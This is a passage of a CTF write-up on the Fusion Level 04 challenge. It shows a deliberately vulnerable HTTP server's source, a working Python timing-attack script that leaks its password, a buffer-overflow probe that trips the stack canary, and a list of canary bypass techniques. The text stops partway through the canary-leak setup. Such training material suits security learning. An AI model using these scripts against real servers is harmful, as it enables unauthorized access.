---
layout: single
title:  "Exploit Excercises - Fusion Level 4"
date:   2020-10-27
excerpt: ""
categories:
  - ctf
  - infosec
tags:
  - binary exploitation
  - exploit development
  - rop chaining
  - aslr
  - stack canary
  - position independent executable
---

## Summary

Fusion Level 04 was a tough challenge from exploit excercises that required the pwner to implement a timing attack and defeat modern countermeasures implemented by the compiler (stack canary, PIE, and non-executable stack) and operating system (ASLR). This was the most realistic binary exploitation challenge I have done yet which proves that in certain applications, buffer overflows are still exploitable today. You can read more on the challenge [here](http://exploit-exercises.lains.space/fusion/level04/).

## Analyze the Countermeasures

Before developing a binary exploit, we must always check its countermeasures:

```
$ scp  fusion@192.168.254.156:/opt/fusion/bin/level04 .
fusion@192.168.254.156's password:
level04                                                                                                                                                   100%   74KB  49.0MB/s   00:00
kali@kali:~/ctf/fusion/level04$ checksec level04
[*] '/home/kali/ctf/fusion/level04/level04'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

The challenge website also mentions that ASLR (Address Space Layout Randomization) is enabled.

## The Code

Since we have access to the code, we might as well use it to our advantage:

### level04.c

```c
#include "../common/common.c"

// original code from micro_httpd_12dec2005.tar.gz -- acme.com. added vulnerabilities etc ;)

/* micro_httpd - really small HTTP server
**
** Copyright (c) 1999,2005 by Jef Poskanzer <jef@mail.acme.com>.
** All rights reserved.
**
** Redistribution and use in source and binary forms, with or without
** modification, are permitted provided that the following conditions
** are met:
** 1. Redistributions of source code must retain the above copyright
**    notice, this list of conditions and the following disclaimer.
** 2. Redistributions in binary form must reproduce the above copyright
**    notice, this list of conditions and the following disclaimer in the
**    documentation and/or other materials provided with the distribution.
** 
** THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
** ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
** IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
** ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
** FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
** DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
** OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
** HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
** LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
** OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
** SUCH DAMAGE.
*/


#define SERVER_NAME "level04.c"
#define SERVER_URL "https://gist.github.com/b69116098bcc6ef7dfb4"
#define PROTOCOL "HTTP/1.0"
#define RFC1123FMT "%a, %d %b %Y %H:%M:%S GMT"


/* Forwards. */
static void file_details( char* dir, char* name );
static void send_error( int status, char* title, char* extra_header, char* text );
static void send_headers( int status, char* title, char* extra_header,
  char* mime_type, off_t length, time_t mod );
static char* get_mime_type( char* name );
static void strdecode( char* to, char* from );
static int hexit( char c );
static void strencode( char* to, size_t tosize, const char* from );

int webserver(int argc, char **argv);

// random decoder 
void build_decoding_table();

char *password;
int password_size = 16;

int main(int argc, char **argv)
{
  int fd, i;
  char *args[6];

  /* Securely generate a password for this session */

  secure_srand();
  password = calloc(password_size, 1);
  for(i = 0; i < password_size; i++) {
      switch(rand() % 3) {
          case 0: password[i] = (rand() % 25) + 'a'; break;
          case 1: password[i] = (rand() % 25) + 'A'; break;
          case 2: password[i] = (rand() % 9) + '0'; break;
      }
  }

  // printf("password is %s\n", password);

  background_process(NAME, UID, GID); 
  fd = serve_forever(PORT);
  set_io(fd);
  alarm(15);

  args[0] = "/opt/fusion/bin/stack06";
  args[1] = "/opt/fusion/run";
  args[2] = NULL;

  build_decoding_table();

  webserver(2, args);
}

// random decoder from stackoverflow
// modified to make more vulnerable

#include <math.h>
#include <stdint.h>
#include <stdlib.h>

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

void base64_decode(const char *data,
                    size_t input_length,
                    unsigned char *output,
                    size_t *output_length) {

    if (decoding_table == NULL) build_decoding_table();

    // printf("data: %p, input_length: %d, output: %p, output_length: %p\n",
    // data, input_length, output, output_length);

    if ((input_length % 4) != 0) {
  // printf("len % 4 = fail\n");
  return;
    }

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
                        + (sextet_b << 2 * 6)
                        + (sextet_c << 1 * 6)
                        + (sextet_d << 0 * 6);

        if (j < *output_length) output[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) output[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) output[j++] = (triple >> 0 * 8) & 0xFF;
    }
}


void build_decoding_table() {

    decoding_table = malloc(256);

    for (int i = 0; i < 0x40; i++)
        decoding_table[encoding_table[i]] = i;
}


void base64_cleanup() {
    free(decoding_table);
}


// end random decoder

int validate_credentials(char *line)
{
  char *p, *pw;
  unsigned char details[2048];
  int bytes_wrong;
  int l;
  struct timeval tv;
  int output_len;


  memset(details, 0, sizeof(details));

  output_len = sizeof(details);

  p = strchr(line, '\n');
  if(p) *p = 0;
  p = strchr(line, '\r');
  if(p) *p = 0;

  // printf("%d\n", strlen(line));
  base64_decode(line, strlen(line), details, &output_len);
  // printf("%s -> %s\n", line, details);
  // fflush(stdout);
  
  p = strchr(details, ':');
  pw = (p == NULL) ? (char *)details : p + 1;

  for(bytes_wrong = 0, l = 0; pw[l] && l < password_size; l++) {
      if(pw[l] != password[l]) {
          
#if 0
          char *buf;
          asprintf(&buf, "[%d] wrong byte (%02x vs %02x)\n", l,
                          password[l], pw[l]);
          write(58, buf, strlen(buf));
#endif
          
          bytes_wrong++;
      }
  }

  // anti bruteforce mechanism. good luck ;>
  
  tv.tv_sec = 0;
  tv.tv_usec = 2500 * bytes_wrong;

  select(0, NULL, NULL, NULL, &tv);

  // printf("%d bytes wrong!\n", bytes_wrong);

  if(l < password_size || bytes_wrong)
      send_error(401, "Unauthorized",
      "WWW-Authenticate: Basic realm=\"stack06\"",
      "Unauthorized");

  return 1;
}

int
webserver( int argc, char** argv )
    {
    char line[10000], method[10000], path[10000], protocol[10000], idx[20000];
    char location[20000], command[20000];
    char* file;
    size_t len;
    int ich;
    struct stat sb;
    FILE* fp;
    struct dirent **dl;
    int i, n;
    int authed = 0;

    if ( argc != 2 )
  send_error( 500, "Internal Error", (char*) 0,
  "Config error - no dir specified." );
    if ( chdir( argv[1] ) < 0 )
  send_error( 500, "Internal Error", (char*) 0,
  "Config error - couldn't chdir()." );
    if ( fgets( line, sizeof(line), stdin ) == (char*) 0 )
  send_error( 400, "Bad Request", (char*) 0,
  "No request found." );
    if ( sscanf( line, "%[^ ] %[^ ] %[^ ]", method, path, protocol ) != 3 )
  send_error( 400, "Bad Request", (char*) 0, "Can't parse request." );
    while ( fgets( line, sizeof(line), stdin ) != (char*) 0 )
  {
        if ( strncmp ( line, "Authorization: Basic ", 21) == 0)
      authed = validate_credentials(line + 21);
      
  if ( strcmp( line, "\n" ) == 0 || strcmp( line, "\r\n" ) == 0 )
      break;
  }
    if ( ! authed) send_error(401, "Unauthorized",
      "WWW-Authenticate: Basic realm=\"stack06\"",
      "Unauthorized");

    if ( strcasecmp( method, "get" ) != 0 )
  send_error( 501, "Not Implemented", (char*) 0,
  "That method is not implemented." );
    if ( path[0] != '/' )
  send_error( 400, "Bad Request", (char*) 0, "Bad filename." );
    file = &(path[1]);
    strdecode( file, file );
    if ( file[0] == '\0' )
  file = "./";
    len = strlen( file );
    if ( file[0] == '/' || strcmp( file, ".." ) == 0 ||
      strncmp( file, "../", 3 ) == 0 || strstr( file, "/../" ) != (char*) 0 ||
      strcmp( &(file[len-3]), "/.." ) == 0 )
  send_error( 400, "Bad Request", (char*) 0, "Illegal filename." );
    if ( stat( file, &sb ) < 0 )
  send_error( 404, "Not Found", (char*) 0, "File not found." );
    if ( S_ISDIR( sb.st_mode ) )
  {
  if ( file[len-1] != '/' )
      {
      (void) snprintf(
      location, sizeof(location), "Location: %s/", path );
      send_error( 302, "Found", location, "Directories must end with a slash." );
      }
  (void) snprintf( idx, sizeof(idx), "%sindex.html", file );
  if ( stat( idx, &sb ) >= 0 )
      {
      file = idx;
      goto do_file;
      }
  send_headers( 200, "Ok", (char*) 0, "text/html", -1, sb.st_mtime );
  (void) printf( "<html><head><title>Index of %s</title></head>\n"
      "<body bgcolor=\"#99cc99\"><h4>Index of %s</h4>\n<pre>\n",
      file, file );
  n = scandir( file, &dl, NULL, alphasort );
  if ( n < 0 )
      perror( "scandir" );
  else
      for ( i = 0; i < n; ++i )
      file_details( file, dl[i]->d_name );
  (void) printf( "</pre>\n<hr>\n<address><a href=\"%s\">%s</a></address>"
      "\n</body></html>\n", SERVER_URL, SERVER_NAME );
  }
    else
  {
  do_file:
  fp = fopen( file, "r" );
  if ( fp == (FILE*) 0 )
      send_error( 403, "Forbidden", (char*) 0, "File is protected." );
  send_headers( 200, "Ok", (char*) 0, get_mime_type( file ), sb.st_size,
      sb.st_mtime );
  while ( ( ich = getc( fp ) ) != EOF )
      putchar( ich );
  }

    (void) fflush( stdout );
    exit( 0 );
    }


static void
file_details( char* dir, char* name )
    {
    static char encoded_name[1000];
    static char path[2000];
    struct stat sb;
    char timestr[16];

    strencode( encoded_name, sizeof(encoded_name), name );
    (void) snprintf( path, sizeof(path), "%s/%s", dir, name );
    if ( lstat( path, &sb ) < 0 )
  (void) printf( "<a href=\"%s\">%-32.32s</a>    ???\n",
      encoded_name, name );
    else
  {
  (void) strftime( timestr, sizeof(timestr), "%d%b%Y %H:%M",
      localtime( &sb.st_mtime ) );
  (void) printf( "<a href=\"%s\">%-32.32s</a>    %15s %14lld\n",
      encoded_name, name, timestr, (int64_t) sb.st_size );
  }
    }


static void
send_error( int status, char* title, char* extra_header, char* text )
    {
    send_headers( status, title, extra_header, "text/html", -1, -1 );
    (void) printf( "<html><head><title>%d %s</title></head>\n<body "
      "bgcolor=\"#cc9999\"><h4>%d %s</h4>\n", status,
      title, status, title );
    (void) printf( "%s\n", text );
    (void) printf( "<hr>\n<address><a href=\"%s\">%s</a></address>"
      "\n</body></html>\n", SERVER_URL, SERVER_NAME );
    (void) fflush( stdout );
    exit( 1 );
    }


static void
send_headers( int status, char* title, char* extra_header,
  char* mime_type, off_t length, time_t mod )
    {
    time_t now;
    char timebuf[100];

    (void) printf( "%s %d %s\015\012", PROTOCOL, status, title );
    (void) printf( "Server: %s\015\012", SERVER_NAME );
    now = time( (time_t*) 0 );
    (void) strftime( timebuf, sizeof(timebuf), RFC1123FMT, gmtime( &now ) );
    (void) printf( "Date: %s\015\012", timebuf );
    if ( extra_header != (char*) 0 )
  (void) printf( "%s\015\012", extra_header );
    if ( mime_type != (char*) 0 )
  (void) printf( "Content-Type: %s\015\012", mime_type );
    if ( length >= 0 )
  (void) printf( "Content-Length: %lld\015\012", (int64_t) length );
    if ( mod != (time_t) -1 )
  {
  (void) strftime( timebuf, sizeof(timebuf), RFC1123FMT, gmtime( &mod ) );
  (void) printf( "Last-Modified: %s\015\012", timebuf );
  }
    (void) printf( "Connection: close\015\012" );
    (void) printf( "\015\012" );
    }


static char*
get_mime_type( char* name )
    {
    char* dot;

    dot = strrchr( name, '.' );
    if ( dot == (char*) 0 )
  return "text/plain; charset=iso-8859-1";
    if ( strcmp( dot, ".html" ) == 0 || strcmp( dot, ".htm" ) == 0 )
  return "text/html; charset=iso-8859-1";
    if ( strcmp( dot, ".jpg" ) == 0 || strcmp( dot, ".jpeg" ) == 0 )
  return "image/jpeg";
    if ( strcmp( dot, ".gif" ) == 0 )
  return "image/gif";
    if ( strcmp( dot, ".png" ) == 0 )
  return "image/png";
    if ( strcmp( dot, ".css" ) == 0 )
  return "text/css";
    if ( strcmp( dot, ".au" ) == 0 )
  return "audio/basic";
    if ( strcmp( dot, ".wav" ) == 0 )
  return "audio/wav";
    if ( strcmp( dot, ".avi" ) == 0 )
  return "video/x-msvideo";
    if ( strcmp( dot, ".mov" ) == 0 || strcmp( dot, ".qt" ) == 0 )
  return "video/quicktime";
    if ( strcmp( dot, ".mpeg" ) == 0 || strcmp( dot, ".mpe" ) == 0 )
  return "video/mpeg";
    if ( strcmp( dot, ".vrml" ) == 0 || strcmp( dot, ".wrl" ) == 0 )
  return "model/vrml";
    if ( strcmp( dot, ".midi" ) == 0 || strcmp( dot, ".mid" ) == 0 )
  return "audio/midi";
    if ( strcmp( dot, ".mp3" ) == 0 )
  return "audio/mpeg";
    if ( strcmp( dot, ".ogg" ) == 0 )
  return "application/ogg";
    if ( strcmp( dot, ".pac" ) == 0 )
  return "application/x-ns-proxy-autoconfig";
    return "text/plain; charset=iso-8859-1";
    }


static void
strdecode( char* to, char* from )
    {
    for ( ; *from != '\0'; ++to, ++from )
  {
  if ( from[0] == '%' && isxdigit( from[1] ) && isxdigit( from[2] ) )
      {
      *to = hexit( from[1] ) * 16 + hexit( from[2] );
      from += 2;
      }
  else
      *to = *from;
  }
    *to = '\0';
    }


static int
hexit( char c )
    {
    if ( c >= '0' && c <= '9' )
  return c - '0';
    if ( c >= 'a' && c <= 'f' )
  return c - 'a' + 10;
    if ( c >= 'A' && c <= 'F' )
  return c - 'A' + 10;
    return 0;       /* shouldn't happen, we're guarded by isxdigit() */
    }


static void
strencode( char* to, size_t tosize, const char* from )
    {
    int tolen;

    for ( tolen = 0; *from != '\0' && tolen + 4 < tosize; ++from )
  {
  if ( isalnum(*from) || strchr( "/_.-~", *from ) != (char*) 0 )
      {
      *to = *from;
      ++to;
      ++tolen;
      }
  else
      {
      (void) sprintf( to, "%%%02x", (int) *from & 0xff );
      to += 3;
      tolen += 3;
      }
  }
    *to = '\0';
    }
```

## Objectives

* Get a shell on fusion by exploiting `level04`.

## The Setup

All challenges on fusion require a very specific runtime environment, so for this challenge we will be using the fusion VM itself as the runtime environment.
Since the challenge represents a web server that forks into child processes, and I am more familiar with intel assembly syntax, we can modify the `~/.gdbinit` file below like the following:

```
fusion@fusion:~$ cat ~/.gdbinit
set disassembly-flavor intel
set follow-fork-mode child
fusion@fusion:~$ ls -l .gdbinit
-rw-r--r-- 1 root root 56 2020-10-21 10:45 .gdbinit
```

Next, let's attach GDB to `level04`:

```
fusion@fusion:~$ ps -ef | grep level04
20004     1483     1  0 10:27 ?        00:00:00 /opt/fusion/bin/level04
fusion    1782  1554  0 10:47 pts/0    00:00:00 grep --color=auto level04
fusion@fusion:~$ sudo gdb -q -p 1483
Attaching to process 1483
Reading symbols from /opt/fusion/bin/level04...done.
Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.13.so...done.
done.
Loaded symbols for /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
0xb7859424 in __kernel_vsyscall ()
(gdb) bt
#0  0xb7859424 in __kernel_vsyscall ()
#1  0xb77a4501 in accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:61
#2  0xb787b3b5 in main (argc=1, argv=0xbfe469f4) at level04/../common/common.c:220
(gdb)
```

## Finding the Vulnerability

Let's try some basic fuzzing and see how the program's execution behaves. Since this is an HTTP server, we can try using `curl` to send a basic HTTP request to it.
For completeness, the service is listening on port `20004`:

```
fusion@fusion:~$ sudo netstat -nlp | grep level04
[sudo] password for fusion:
tcp        0      0 0.0.0.0:20004           0.0.0.0:*               LISTEN      1483/level04
```

```
$ curl -vv http://192.168.254.156:20004
*   Trying 192.168.254.156:20004...
* Connected to 192.168.254.156 (192.168.254.156) port 20004 (#0)
> GET / HTTP/1.1
> Host: 192.168.254.156:20004
> User-Agent: curl/7.72.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Server: level04.c
< Date: Tue, 20 Oct 2020 23:52:40 GMT
< WWW-Authenticate: Basic realm="stack06"
< Content-Type: text/html
< Connection: close
<
<html><head><title>401 Unauthorized</title></head>
<body bgcolor="#cc9999"><h4>401 Unauthorized</h4>
Unauthorized
<hr>
<address><a href="https://gist.github.com/2449d15e6fb675383c8b">level04.c</a></address>
</body></html>
* Closing connection 0
```

Looks like we got a `401 Unauthorized`. If we trace this back in the code, we will notice that we invoked the `send_error` function. 

Let's try sending something with a valid `Authorization` header:

```
kali@kali:~/$ curl -vv -H "Authorization: Basic `echo -n admin:admin | base64`" http://192.168.254.156:20004
*   Trying 192.168.254.156:20004...
* Connected to 192.168.254.156 (192.168.254.156) port 20004 (#0)
> GET / HTTP/1.1
> Host: 192.168.254.156:20004
> User-Agent: curl/7.72.0
> Accept: */*
> Authorization: Basic YWRtaW46YWRtaW4=
>
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
* Recv failure: Connection reset by peer
* Closing connection 0
curl: (56) Recv failure: Connection reset by peer
```

Analyzing the stack trace in gdb, we notice that the `level04` tried to validate the credential:

```
Breakpoint 1, send_error (status=5, title=0x1 <Address 0x1 out of bounds>,
    extra_header=0x0, text=0x10 <Address 0x10 out of bounds>) at level04/level04.c:319
319     in level04/level04.c
(gdb) bt
#0  send_error (status=5, title=0x1 <Address 0x1 out of bounds>, extra_header=0x0,
    text=0x10 <Address 0x10 out of bounds>) at level04/level04.c:319
#1  0xb787c2e4 in validate_credentials (line=0xbfe3cc71 "YWRtaW46YWRtaW4=")
    at level04/level04.c:209
#2  0xb787c4c0 in webserver (argc=0, argv=0x4) at level04/level04.c:237
#3  0xb787b4d0 in main (argc=1, argv=0xbfe469f4) at level04/level04.c:86
```

After analyzing the code, it doesn't look like we can branch the program's execution anywhere else without first guessing the password.

## Updated Objectives

1. Leak the web server's password.
2. Pop a shell.

## Hunting for Buffer Overflows

Let's quickly examing the first few lines of the `validate_credentials` function:

```c
int validate_credentials(char *line)
{
  char *p, *pw;
  unsigned char details[2048];
  int bytes_wrong;
  int l;
  struct timeval tv;
  int output_len;


  memset(details, 0, sizeof(details));

  output_len = sizeof(details);

  p = strchr(line, '\n');
  if(p) *p = 0;
  p = strchr(line, '\r');
  if(p) *p = 0;

  // printf("%d\n", strlen(line));
  base64_decode(line, strlen(line), details, &output_len);
```

Notice that the `line` argument is base64-decoded into `details` which is a buffer that can hold up to 2048 bytes.
The `details` buffer will be the victim of our stack buffer overflow attack since the attacker controls the `line` argument.
Let's see how many bytes a `line` can be:

### level04.c lines 220-248

```c
int
webserver( int argc, char** argv )
    {
    char line[10000], method[10000], path[10000], protocol[10000], idx[20000];
    char location[20000], command[20000];
    char* file;
    size_t len;
    int ich;
    struct stat sb;
    FILE* fp;
    struct dirent **dl;
    int i, n;
    int authed = 0;

    if ( argc != 2 )
  send_error( 500, "Internal Error", (char*) 0,
  "Config error - no dir specified." );
    if ( chdir( argv[1] ) < 0 )
  send_error( 500, "Internal Error", (char*) 0,
  "Config error - couldn't chdir()." );
    if ( fgets( line, sizeof(line), stdin ) == (char*) 0 )
  send_error( 400, "Bad Request", (char*) 0,
  "No request found." );
    if ( sscanf( line, "%[^ ] %[^ ] %[^ ]", method, path, protocol ) != 3 )
  send_error( 400, "Bad Request", (char*) 0, "Can't parse request." );
    while ( fgets( line, sizeof(line), stdin ) != (char*) 0 )
  {
        if ( strncmp ( line, "Authorization: Basic ", 21) == 0)
      authed = validate_credentials(line + 21);
```

The web server reads one line at a time. Each line is `10000` bytes so we can overflow the `details` buffer in `validate_credentials()` via the `line` buffer in `webserver()`. 

Unfortunately, if we want the program's execution to reach the overflowed return address in `validate_credentials()`, we need the password. Without the right password, `send_error` will call `exit`, terminating the program before we can jump to the overflowed return address back in `validate_credentials`.

### level04.c lines 212-217

```c
  if(l < password_size || bytes_wrong)
      send_error(401, "Unauthorized",
      "WWW-Authenticate: Basic realm=\"stack06\"",
      "Unauthorized");

  return 1;
```

## Leaking the Password

Let's take a step back and look at the following code snippet in `validate_credentials()`:

### level04.c lines 182-208

```c
  for(bytes_wrong = 0, l = 0; pw[l] && l < password_size; l++) {
      if(pw[l] != password[l]) {

#if 0
          char *buf;
          asprintf(&buf, "[%d] wrong byte (%02x vs %02x)\n", l,
                          password[l], pw[l]);
          write(58, buf, strlen(buf));
#endif

          bytes_wrong++;
      }
  }

  // anti bruteforce mechanism. good luck ;>

  tv.tv_sec = 0;
  tv.tv_usec = 2500 * bytes_wrong;

  select(0, NULL, NULL, NULL, &tv);
```

For those familiar with `C` programming, the `select()` function introduces a delay which the authors decided to introduce as an anti-bruteforce mechanism.
Since we control the `bytes_wrong` variable, we should be able to leak one byte at a time.
Therefore, if we are going to implement a timing attack, we should verify that our first input will represent all invalid bytes.
Consider the following code:


### level04.c lines 54-72

```c
char *password;
int password_size = 16;

int main(int argc, char **argv)
{
  int fd, i;
  char *args[6];

  /* Securely generate a password for this session */

  secure_srand();
  password = calloc(password_size, 1);
  for(i = 0; i < password_size; i++) {
      switch(rand() % 3) {
          case 0: password[i] = (rand() % 25) + 'a'; break;
          case 1: password[i] = (rand() % 25) + 'A'; break;
          case 2: password[i] = (rand() % 9) + '0'; break;
      }
  }
```

Since the `password` is a global variable, its value will persist and remain the same amongst forked processes.
The password is also limited to alphanumeric characters, which means we can predict which bytes will never exist in a password.
With this knowledge, we can leak the password using a timing attack with the exploit below:

```python
import argparse
import base64
import binascii
import collections
import time
import string
import sys
from pwn import *

# Pwn context
context.arch = 'i386'

# Environment
PASSWORD_LEN = 16

def make_payload(args, overflow):
    payload = b"".join([
      b"GET / HTTP/1.0\r\n",
      b"Host: " + args.host.encode('utf-8') + b":" + str(args.port).encode('UTF-8') + b"\r\n"
      b"User-Agent: curl/7.72.0\r\n"
      b"Accept: */*\r\n"
      b"Authorization: Basic ",
      base64.b64encode(b":" + overflow),
      b"\r\n\r\n"
    ])
    return payload

def compute_roundtrips(args, guessed_bytes=b""):
    roundtrips = []
    invalid_byte = b"\xff" # Character outside the alphanumeric range
    invalid_byte_len = PASSWORD_LEN - len(guessed_bytes)
    overflow = guessed_bytes + invalid_byte * invalid_byte_len
    for _ in range(args.delay_loops):
        conn = remote(args.host, args.port)
        payload = make_payload(args, overflow)
        start = time.time()
        conn.send(payload)
        conn.recvall()
        roundtrips.append(time.time() - start)
        conn.close()
    return roundtrips

def leak_password(args):
    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
    password = bytearray(b"\xff" * PASSWORD_LEN)
    print('Leaking password: ', end='')
    for i in range(PASSWORD_LEN):
        context.log_level = 'warn'
        counter = collections.Counter()
        for c in alphabet:
            password[i] = ord(c.encode('utf-8'))
            roundtrips = compute_roundtrips(args, password)
            average_roundtrip_time = sum(roundtrips) / len(roundtrips)
            counter[c] = average_roundtrip_time
        guessed_character = min(counter, key=counter.get)
        password[i] = ord(guessed_character.encode('utf-8'))
        context.log_level = 'info'
        print(f'{guessed_character}', end='')
    print("\n")
    return password

def exploit(args):
    password = leak_password(args)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fusion level04 exploit by r0kit.')
    parser.add_argument('--host', dest='host', type=str, required=True)
    parser.add_argument('--port', dest='port', type=int, default=20004)
    parser.add_argument('--password-leak-delay-loops', dest='delay_loops', type=int, default=10)

    try:
        args = parser.parse_args()
        exploit(args)

    except argparse.ArgumentError as e:
        print("[!] {}".format(e))
        parser.print_usage()
        sys.exit(1)
```

Keep in mind that in timing attacks, you will want to collect more stats per character guessed to avoid false positives.
In my script above, setting `--password-leak-delay-loops` to 10 was sufficient to fully leak the password without false positives on a local VMWare network.

*Note that if the password still won't leak properly, I recommend leaking more passwords as samples and using the bytes that overlap the most between each leak attempt.*

```
$ python3 exploit.py
Leaking password: 52H2h2c3uEP2LYRX
```

Now, let's try authenticating with the password:

```
kali@kali:~/ctf/fusion/level04$ curl -vv -H "Authorization: Basic `echo -n :52H2h2c3uEP2LYRX |
 base64`" http://192.168.254.156:20004
*   Trying 192.168.254.156:20004...
* Connected to 192.168.254.156 (192.168.254.156) port 20004 (#0)
> GET / HTTP/1.1
> Host: 192.168.254.156:20004
> User-Agent: curl/7.72.0
> Accept: */*
> Authorization: Basic OjUySDJoMmMzdUVQMkxZUlg=
>
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 Ok
< Server: level04.c
< Date: Sun, 25 Oct 2020 20:18:41 GMT
< Content-Type: text/html
< Last-Modified: Fri, 27 Apr 2012 08:00:12 GMT
< Connection: close
<
<html><head><title>Index of ./</title></head>
<body bgcolor="#99cc99"><h4>Index of ./</h4>
<pre>
<a href=".">.                               </a>    27Apr2012 18:00            220
<a href="..">..                              </a>    15Dec2011 10:37             60
<a href="core">core                            </a>    07Apr2012 12:40         339968
<a href="level00.pid">level00.pid                     </a>    26Oct2020 04:22              5
<a href="level01.pid">level01.pid                     </a>    06Nov2012 13:43              5
<a href="level02.pid">level02.pid                     </a>    26Oct2020 04:22              5
<a href="level03.pid">level03.pid                     </a>    26Oct2020 04:22              5
<a href="level04.pid">level04.pid                     </a>    26Oct2020 04:22              5
<a href="level05.pid">level05.pid                     </a>    26Oct2020 04:22              5
<a href="level06.pid">level06.pid                     </a>    26Oct2020 04:22              5
<a href="level07.pid">level07.pid                     </a>    26Oct2020 04:22              5
<a href="level09.pid">level09.pid                     </a>    26Oct2020 01:21              5
<a href="level10.pid">level10.pid                     </a>    08Apr2012 22:26              5
<a href="level11.pid">level11.pid                     </a>    09Apr2012 10:25              5
<a href="level12.pid">level12.pid                     </a>    26Oct2020 01:21              5
<a href="level13.pid">level13.pid                     </a>    21Apr2012 19:01              6
<a href="level14.pid">level14.pid                     </a>    28Apr2012 20:48              6
</pre>
<hr>
<address><a href="https://gist.github.com/2449d15e6fb675383c8b">level04.c</a></address>
</body></html>
* Closing connection 0
```

Success! The leaked password worked!


Now that we have bypassed the authentication mechanism, we should be able to execute the overflowed return address in `validate_credentials()`!
Interestingly, we can still prefix the payload of our buffer overflow with the valid password to bypass authentication before overflowing the return address.

```python
import base64
import string
import sys
import time
from pwn import *

# Pwn context
context.arch = 'i386'
context.log_level = 'debug'

# Environment
HOST = '192.168.254.156'
PORT = 20004
PASSWORD = '52H2h2c3uEP2LYRX'

conn = remote(HOST, PORT)
overflow = b"A" * 5000
payload = b"".join([
  b"GET / HTTP/1.0\r\n",
  b"Host: " + HOST.encode('utf-8') + b":" + str(PORT).encode('UTF-8') + b"\r\n"
  b"User-Agent: curl/7.72.0\r\n"
  b"Accept: */*\r\n"
  b"Authorization: Basic " + base64.b64encode(b":" + PASSWORD.encode('UTF-8') + overflow),
  b"\r\n\r\n"
])

conn.send(payload)
conn.recvall()
conn.close()
```


```
kali@kali:~/ctf/fusion/level04$ python3 test-stack-smashing.py
[+] Opening connection to 192.168.254.156 on port 20004: Done
[DEBUG] Sent 0x1a90 bytes:
    b'GET / HTTP/1.0\r\n'
    b'Host: 192.168.254.156:20004\r\n'
    b'User-Agent: curl/7.72.0\r\n'
    b'Accept: */*\r\n'
    b'Authorization: Basic OjUySDJoMmMzdUVQMkxZUlhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ
	... CONTENT SNIPPED ...
UFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==\r\n'
    b'\r\n'
[+] Receiving all data: Done (68B)
[DEBUG] Received 0x44 bytes:
    b'*** stack smashing detected ***: /opt/fusion/bin/level04 terminated\n'
[*] Closed connection to 192.168.254.156 port 20004
```

And it looks like the stack smashing countermeasure was triggered!
This is the result of overwriting a stack canary which was altered from its original value.

### Stack Canary Bypass Techniques

1. Overwrite the `__stack_chk_fail` entry in the GOT.
2. Leak the canary with some output operation.
3. Brute force the stack canary in apps that use `fork()` to copy the parent's process stack into the child process.
4. Overwrite the Canary value stored in TLS.

You can read more on defeating stack canaries [here](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/).

## Leaking the Stack Canary

Since the process calls `fork()`, it copies its stack into its child processes. This means that the stack canary will remain the same each time the child process terminates/crashes and we should eventually be able to leak it with enough attempts.

It is also important to know where the canary is located on the stack. You can use the following `gdb` script on the `fusion` machine to examine the memory like in this writeup:

### .gdbinit

```
set disassembly-flavor intel
set follow-fork-mode child
